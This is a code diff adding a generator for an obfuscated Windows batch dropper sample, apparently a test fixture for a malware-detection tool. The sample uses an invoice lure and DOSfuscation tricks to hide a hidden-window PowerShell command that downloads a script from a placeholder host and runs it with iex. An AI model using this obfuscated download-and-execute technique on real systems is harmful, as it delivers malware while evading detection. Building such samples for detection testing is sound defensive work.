@@ -1307,6 +1307,29 @@ def xor_loader_vbs() -> bytes:
             "Execute s\r\n").encode("utf-8")
 
 
+def dosfuscation_bat() -> bytes:
+    """Batch launcher with DOSfuscation tricks (inert): "powershell" rebuilt by a
+    FOR-loop index list over a scrambled char set, the download URL reversed with
+    for /L, "cmd" sliced out of %COMSPEC% / %PUBLIC%, caret noise and an inline
+    set chain under cmd /V:ON /C. The final PowerShell fetches the "invoice"."""
+    comspec = "C:\\WINDOWS\\system32\\cmd.exe"
+    charset = "lrhweops"
+    word = "powershell"
+    idx = ",".join(str(charset.index(c)) for c in word)
+    url = "http://invoice-files.example/Factura_2024-0613.ps1"
+    rev = url[::-1]
+    cmd = "".join(f"%COMSPEC:~{comspec.index(c) - len(comspec)},1%" for c in "cmd")
+    return ("@echo off\r\n"
+            ":: Factura 2024-0613 - descarga del visor\r\n"
+            "setlocal EnableDelayedExpansion\r\n"
+            f"set c={charset}\r\n"
+            f"for %%i in ({idx}) do set p=!p!!c:~%%i,1!\r\n"
+            f"set u={rev}\r\n"
+            f"for /L %%i in ({len(rev) - 1},-1,0) do set \"w=!w!!u:~%%i,1!\"\r\n"
+            f"{cmd} /V:ON /C \"set k=-w h^i^d^den -c&&set q=i\"\"w\"\"r&&call !p! !k! !q! !w! ^| iex\"\r\n"
+            "rem fallback 192.0.2.44\r\n").encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1316,7 +1339,7 @@ def build_all() -> dict[str, bytes]:
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_obf_techniques.js": obf_techniques_js(),
         "sample_chain_dropper.js": chain_dropper_js(), "sample_msxml_dropper.js": msxml_dropper_js(), "sample_wsh_selfread.js": wsh_selfread_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
-        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(), "sample_invoke_obfuscation.ps1": invoke_obfuscation_ps1(), "sample_xor_loader.vbs": xor_loader_vbs(),
+        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(), "sample_invoke_obfuscation.ps1": invoke_obfuscation_ps1(), "sample_xor_loader.vbs": xor_loader_vbs(), "sample_dosfuscation.bat": dosfuscation_bat(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
